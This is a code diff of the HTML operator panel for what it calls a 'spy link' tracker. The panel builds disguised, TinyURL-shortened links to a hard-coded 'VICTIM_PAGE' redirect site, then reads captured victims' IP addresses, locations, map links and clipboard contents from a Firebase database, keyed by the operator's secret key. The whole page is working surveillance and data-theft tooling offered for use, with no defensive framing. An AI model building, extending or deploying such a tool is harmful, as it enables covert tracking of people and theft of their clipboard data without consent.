@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MA LEGEND HQ | FIXED</title>
+    <title>MA LEGEND | TRACKER HQ</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Poppins:wght@400;600&display=swap');
         body { background: #e0e5ec; font-family: 'Poppins', sans-serif; color: #44476a; padding: 15px; display: flex; justify-content: center; }
@@ -11,27 +11,32 @@
         .neu-card { background: #e0e5ec; padding: 25px; border-radius: 30px; box-shadow: 9px 9px 16px #bcbfc5, -9px -9px 16px #ffffff; margin-bottom: 25px; }
         h2 { font-family: 'Orbitron'; color: #00a884; text-align: center; }
         input { width: 100%; padding: 12px; border: none; border-radius: 12px; background: #e0e5ec; box-shadow: inset 4px 4px 8px #cbcbe1, inset -4px -4px 8px #ffffff; outline: none; margin: 8px 0; box-sizing: border-box; }
-        .btn { width: 100%; padding: 12px; border: none; border-radius: 15px; background: #e0e5ec; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; color: #00a884; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; margin-top: 10px; }
+        .btn { width: 100%; padding: 14px; border: none; border-radius: 15px; background: #e0e5ec; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; color: #00a884; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; margin-top: 10px; transition: 0.3s; }
         .btn:active { box-shadow: inset 3px 3px 6px #bcbfc5, inset -3px -3px 6px #ffffff; }
-        .log-card { background: #e0e5ec; padding: 15px; border-radius: 20px; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; margin-top: 15px; border-left: 6px solid #00a884; font-size: 0.8rem; }
-        pre { background: #1e1e1e; color: #00ffcc; padding: 10px; border-radius: 10px; overflow-x: auto; white-space: pre-wrap; }
+        .log-card { background: #e0e5ec; padding: 15px; border-radius: 20px; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; margin-top: 15px; border-left: 6px solid #00a884; font-size: 0.85rem; }
+        .copy-area { display: flex; gap: 10px; display: none; margin-top: 10px; }
+        pre { background: #1e1e1e; color: #00ffcc; padding: 10px; border-radius: 10px; overflow-x: auto; white-space: pre-wrap; font-size: 0.8rem; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="neu-card">
-            <h2>MA LEGEND HQ</h2>
+            <h2>LEGEND TRACKER V6</h2>
             <input type="text" id="masterKey" placeholder="Secret Key (e.g. Legend786)">
-            <input type="text" id="targetUrl" placeholder="Target Link (YouTube etc)">
-            <button class="btn" onclick="generateLink()">GENERATE LINK</button>
-            <div id="result" style="display:none; margin-top:15px;">
-                <input type="text" id="finalLink" readonly>
+            <input type="text" id="targetUrl" placeholder="Redirect Link (e.g. https://youtube.com)">
+            <button class="btn" id="genBtn" onclick="generateLink()" style="background: #00a884; color: white;">GENERATE SPY LINK</button>
+            
+            <div id="resultArea" class="copy-area">
+                <input type="text" id="finalLink" readonly style="margin:0; color:#00a884; font-weight:bold;">
+                <button class="btn" style="width: auto; margin:0; padding:10px;" onclick="copyLink()">COPY</button>
             </div>
         </div>
-        <div style="display:flex; gap:10px;">
-            <button class="btn" onclick="fetchData('tracking')">LOCATIONS</button>
-            <button class="btn" onclick="fetchData('clipboard')">CLIPBOARD</button>
+
+        <div style="display: flex; gap: 10px;">
+            <button class="btn" onclick="fetchLogs('tracking')">VIEW LOCATIONS</button>
+            <button class="btn" onclick="fetchLogs('clipboard')">VIEW CLIPBOARD</button>
         </div>
+
         <div id="displayArea"></div>
     </div>
 
@@ -39,29 +44,49 @@
         const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
         const VICTIM_PAGE = "https://video-obtg.vercel.app/";
 
-        function generateLink() {
+        async function generateLink() {
             const key = document.getElementById('masterKey').value.trim();
-            const url = document.getElementById('targetUrl').value.trim();
-            if(!key || !url) return alert("Fill details!");
+            const url = document.getElementById('targetUrl').value.trim() || "https://google.com";
+            if(!key) return alert("Key lazmi hai!");
             
-            // Simple Base64 encoding for URL
             const payload = btoa(JSON.stringify({ k: key, r: url }));
-            const fullLink = `${VICTIM_PAGE}?id=${payload}`;
+            const longLink = `${VICTIM_PAGE}?id=${payload}`;
             
-            document.getElementById('finalLink').value = fullLink;
-            document.getElementById('result').style.display = 'block';
+            try {
+                const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longLink)}`);
+                document.getElementById('finalLink').value = await res.text();
+            } catch(e) { document.getElementById('finalLink').value = longLink; }
+            
+            document.getElementById('resultArea').style.display = 'flex';
         }
 
-        async function fetchData(path) {
+        function copyLink() {
+            const el = document.getElementById("finalLink");
+            el.select();
+            document.execCommand("copy");
+            alert("Link Copied!");
+        }
+
+        async function fetchLogs(path) {
             const key = document.getElementById('masterKey').value.trim();
+            if(!key) return alert("Key enter karein!");
+            
+            const area = document.getElementById('displayArea');
+            area.innerHTML = "<p style='text-align:center;'>Fetching...</p>";
+            
             const res = await fetch(`${DB_URL}${path}/${key}.json`);
             const data = await res.json();
-            const area = document.getElementById('displayArea');
-            area.innerHTML = "";
-            if(!data) return area.innerHTML = "<p>No data found.</p>";
+            
+            area.innerHTML = `<h3>${path.toUpperCase()} DATA</h3>`;
+            if(!data) return area.innerHTML += "<p>No data found.</p>";
+
             Object.keys(data).reverse().forEach(id => {
                 const item = data[id];
-                area.innerHTML += `<div class="log-card"><b>${item.time}</b><br>${item.ip || ''} - ${item.loc || ''}<pre>${item.clipData || 'No Clip Data'}</pre></div>`;
+                area.innerHTML += `<div class="log-card">
+                    <b>🕒 ${item.time}</b><br>
+                    ${item.ip ? `📍 IP: ${item.ip} | Loc: ${item.loc}<br><a href="${item.map}" target="_blank">Open Map</a>` : ''}
+                    ${item.clipData ? `<pre>${item.clipData}</pre>` : ''}
+                </div>`;
             });
         }
     </script>
